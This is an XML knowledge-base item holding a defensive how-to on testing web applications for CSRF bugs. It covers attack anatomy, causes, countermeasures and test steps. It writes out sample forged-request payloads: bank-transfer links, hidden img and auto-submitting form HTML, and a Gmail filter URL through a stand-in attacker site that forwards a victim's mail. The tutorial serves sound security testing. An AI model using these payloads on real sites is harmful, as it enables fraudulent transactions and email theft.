<?xml version="1.0" encoding="utf-8"?>
<guidanceItem id="5339f0d4-6052-44a5-9d83-09a116ffdd13" Author="" Category="Session Management" Priority="Andres De Vivanco" Rule_Type="How To" Status="" Technology=" Any" title="How to Test for Cross-Site Request Forgery (CSRF) Bugs" Topic="Security" phase="Test" xmlns="urn:microsoft:guidanceexplorer:guidanceItem">
  <content>&lt;h1&gt;Applies to:&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h1&gt;Summary&lt;/h1&gt;&lt;p&gt;During Cross-Site Request Forgery (CSRF) -also known as &lt;em&gt;XSRF&lt;/em&gt; or &lt;em&gt;session riding&lt;/em&gt;- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.&amp;nbsp;&amp;nbsp; For example, an attacker tricks the victim client into calling a banking function in a vulnerable page that transfers money from the victim’s to the attacker’s account.&amp;nbsp; The victim triggers the attack by following an attacker’s link or visiting an attacker’s page.&amp;nbsp; The vulnerable server page doesn’t recheck the authenticity of the victim’s request and allows the transfer to proceed.&lt;/p&gt;&lt;p&gt;Follow these steps to test for CSRF bugs:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios &lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures &lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Fine-tune Test Cases&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/h1&gt;&lt;p&gt;The first step in testing for CSRF bugs is to understand its attack scenarios.&amp;nbsp; Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:&amp;nbsp; attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions, send spoofed email messages, steal sensitive information, and even install a back door.&amp;nbsp; The following steps detail the anatomy of a CSRF attack:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Attacker finds functionality in a web application that is vulnerable to CSRF. &lt;/li&gt;&lt;li&gt;Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack. &lt;/li&gt;&lt;li&gt;Attacker waits until the victim client authenticates with the vulnerable web application. &lt;/li&gt;&lt;li&gt;Attacker tricks victim client into following the malicious link. &lt;/li&gt;&lt;li&gt;Victim client sends forged request to vulnerable server. &lt;/li&gt;&lt;li&gt;Vulnerable server allows and executes the forged request. &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;The form of the link built in step 2 depends on the payload that the attacker wants to execute.&amp;nbsp; For example, the link might looks like this when they payload is to transfer money from the victim’s to the attacker’s account:&lt;/p&gt;&lt;pre&gt;&lt;strong&gt;&lt;a&gt;/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&lt;/a&gt;&lt;/strong&gt;&amp;nbsp;&lt;/pre&gt;&lt;p&gt;The link below sends an email titled Hello to johny@example.com: &lt;/p&gt;&lt;pre&gt;&lt;strong&gt;/sendMail?to=johny@example.com&amp;amp;title=Hello&amp;amp;body=I+did+not+send+this'&lt;/strong&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;A serious flaw discovered in Google’s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.&amp;nbsp; In the link below the attacker forwards the victim to the attacker’s site.&amp;nbsp; Then the attacker’s site makes the fraudulent request in behalf of the victim:&lt;/p&gt;&lt;pre&gt;&lt;strong&gt;http://www.attakersite.org/util/csrf?method=POST&amp;amp;enctype=multipart/form-data&amp;amp;_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;amp;cf2emc=true&amp;amp;cf2_email=attacker@attackersite.com&amp;amp;cf1_from&amp;amp;cf1_to&amp;amp;cf1_subj&amp;amp;cf1has&amp;amp;cf1hasnot&amp;amp;cf1attach=true&amp;amp;tfi&amp;amp;s=z&amp;amp;irf=on&amp;amp;nvpbucftb=Create%20Filter&lt;/strong&gt;&lt;/pre&gt;&lt;p&gt;Upon receiving the forged HTTP POST request, Gmail forwards all the victim’s emails to attacker@attackersite.com.&amp;nbsp; Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h1&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures&lt;/h1&gt;&lt;p&gt;During this step you will be shown the causes behind Cross-Site Request Forgery , &amp;nbsp;how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Cross-Site Request Forgery Causes&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;This kind of vulnerability exists because the web application trusts the forged request.&amp;nbsp; Thus, the cause for this bug is a case of poor or missing authentication code.&amp;nbsp; The application lacks the functionality to verify that every client request is not forged and that it actually originates from a legitimate client action.&amp;nbsp;&amp;nbsp; Web applications vulnerable to CSRF implement a &lt;em&gt;persistent&lt;/em&gt; authentication system in which they validate the user against a persistent token such as a session cookie.&amp;nbsp;&amp;nbsp; In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request comes due to a legitimate client action.&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Cross-Site Request Forgery Countermeasures&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;The main prevention against CSRF vulnerabilities is to provide a &lt;em&gt;transient&lt;/em&gt; authentication system [i] instead of a persistent authentication system.&amp;nbsp; Transient authentication systems verify for the authenticity of every request by using an additional check.&amp;nbsp;&amp;nbsp; One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.&amp;nbsp; An attacker will not be able to execute an attack unless he knows the secret.&amp;nbsp; The problem is that an attacker can execute a XSS attack and steal the secret.&lt;/p&gt;&lt;p&gt;There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.&amp;nbsp;&amp;nbsp; A popular way to protect Internet users from CSRF is by using &lt;em&gt;CAPTCHAs&lt;/em&gt; (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.&lt;/p&gt;&lt;p&gt;Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.&amp;nbsp; However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command using a malicious script and can also easily spoof the HTTP referrer.&amp;nbsp; &lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/h1&gt;&lt;p&gt;Now that you’ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Basic Test for Cross-site Request Forgery &lt;/em&gt;&lt;/h2&gt;&lt;p&gt;Follow these test steps to test against CSRF bugs. &lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Find a web application page that performs an action based on a user request. &lt;/li&gt;&lt;li&gt;Construct a page containing a link or redirect that sends a forged request to the application server.&amp;nbsp; This link usually contains a tag such as an img or iframe (although mostly any tags can be used) with the source address pointing to the request: &lt;ul&gt;&lt;li&gt;&lt;pre&gt;&amp;lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amp;amount=100000"&amp;gt;View my Pictures!&amp;lt;/a&amp;gt;&lt;/pre&gt;&lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;&amp;lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amp;amount=100000" width="1" height="1" border="0"&amp;gt;&amp;nbsp;&lt;/pre&gt;&lt;p&gt;Note that the links above will both generate a GET request.&amp;nbsp; In order to test for POST requests you must create a page containing a form with the URL parameters passed as hidden input, and add a script to automatically submit the form:&amp;nbsp;&lt;/p&gt;&lt;pre&gt;&amp;lt;form action="http://bank.com/transfer.do" method="post"&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input type="hidden" name="acct" value="MARIA"&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input type="hidden" name="ammount" value="100000"&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt; &lt;br&gt;&amp;lt;script&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.forms[0].submit();&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;Open an Internet browser and log in to the web application as a legitimate user. &lt;/li&gt;&lt;li&gt;Open the page built in step 2 (follow the link if necessary). &lt;/li&gt;&lt;li&gt;Confirm if the request was successful. &lt;/li&gt;&lt;li&gt;Repeat test case for every application create/update/delete/mail action.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Expected result:&amp;nbsp; the test fails if the application trusts and processes the forged request.&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Test Use of Secret in URLs&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;This test will tell you if your application uses secrets in the URL.&lt;/p&gt;&lt;p&gt;Testing steps:&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Log in to the application as a legitimate user. &lt;/li&gt;&lt;li&gt;Browse to a web form that makes a valid request and uses a secret in the URL:&amp;nbsp; &lt;ul&gt;&lt;li&gt;&lt;pre&gt;http://example.com/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&amp;amp;secret=2y9ryo2hr2&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;Start intercepting network traffic using HTTP(s) WebScarab&lt;a href="about:blank#_edn2" name="_ednref2"&gt;[ii]&lt;/a&gt; proxy. &lt;/li&gt;&lt;li&gt;Configure browser to use WebScarab proxy. &lt;/li&gt;&lt;li&gt;Make another request. &lt;/li&gt;&lt;li&gt;In WebScarab, modify the URL to change the secret to another value: &lt;ul&gt;&lt;li&gt;&lt;pre&gt;http://example.com/makeTransfer?amount=1000&amp;amp;dest=attacker@attackersite.com'&amp;amp;secret=&lt;strong&gt;XXXXXXXXXXX&lt;/strong&gt;&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;p&gt;Expected result:&amp;nbsp; The server must disallow the action since the secret was changed in step 6.&amp;nbsp; The test fails if the server allows the requested action.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Test Use of Secret in Cookies&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;This test will tell you if your application properly uses secrets in the cookies.&lt;/p&gt;&lt;p&gt;Testing steps:&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Start intercepting traffic network traffic using WebScarab proxy. &lt;/li&gt;&lt;li&gt;Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user. &lt;/li&gt;&lt;li&gt;Browse to a page that makes a request and submits a secret using a cookie. &lt;/li&gt;&lt;li&gt;Submit request. &lt;/li&gt;&lt;li&gt;In WebScarab, replace the secret in the cookie.&amp;nbsp; For instance: &lt;/li&gt;&lt;/ol&gt;&lt;blockquote&gt;&lt;pre&gt;GET http://www.example.com/trasnfer?amount=1000&amp;amp;dest=1234 HTTP/1.1&lt;br&gt;Host: localhost&lt;br&gt;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14&lt;br&gt;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&lt;br&gt;Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3&lt;br&gt;Accept-Encoding: gzip,deflate&lt;br&gt;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7&lt;br&gt;Keep-Alive: 300&lt;br&gt;Proxy-Connection: keep-alive&lt;br&gt;Cookie: session-ID=1089eq14; secret=1240u9309u2efija&lt;strong&gt;XXXX&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&lt;/pre&gt;&lt;/blockquote&gt;&lt;p&gt;Expected result:&amp;nbsp; The server must disallow the action since the secret was changed in step 6.&amp;nbsp; The test fails if the server allows the requested action.&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h1&gt;Step 4:&amp;nbsp; Fine-tune Test Case Data&lt;/h1&gt;&lt;p&gt;The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.&amp;nbsp; &amp;nbsp;Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Fine-tune Test Case Data per objective&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;Attackers can use CSRF bugs to execute different kinds of attacks.&amp;nbsp; It is important that you test these different payloads depending the characteristics of your application. Common objectives of &amp;nbsp;CSRF attacks include:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Making a fraudulent bank transaction. &lt;/li&gt;&lt;li&gt;Sending spoofed email. &lt;/li&gt;&lt;li&gt;Exploiting an administrative application. &lt;/li&gt;&lt;li&gt;Forcing password resets. &lt;/li&gt;&lt;li&gt;Changing router and firewall configurations [iii].&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;h2&gt;&lt;em&gt;Automate test cases &lt;/em&gt;&lt;/h2&gt;&lt;p&gt;Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.&amp;nbsp; Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.&amp;nbsp; &lt;/p&gt;&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;&lt;h1&gt;Conclusions&lt;/h1&gt;&lt;p&gt;Cross-Site Request Forgery is serious attack class that affects any web application that doesn’t explicitly protect against it.&amp;nbsp; Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.&amp;nbsp;&amp;nbsp; In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;[i] &lt;strong&gt;Cross-Site Request Forgery&lt;/strong&gt;.&amp;nbsp; Wikiepedia. &lt;a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery"&gt;http://en.wikipedia.org/wiki/Cross-site_request_forgery&lt;/a&gt;&lt;/p&gt;&lt;div&gt;&lt;div&gt;&lt;p&gt;&lt;a href="about:blank#_ednref2" name="_edn2"&gt;&lt;/a&gt;[ii] &lt;strong&gt;Session Riding -&amp;nbsp; A Widespread Vulnerability in Today Web Applications. &lt;/strong&gt;Thomas Scheiber, SecureNet GmbH, Dec 2004. &lt;a href="http://www.securenet.de/papers/Session_Riding.pdf"&gt;http://www.securenet.de/papers/Session_Riding.pdf&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;</content>
</guidanceItem>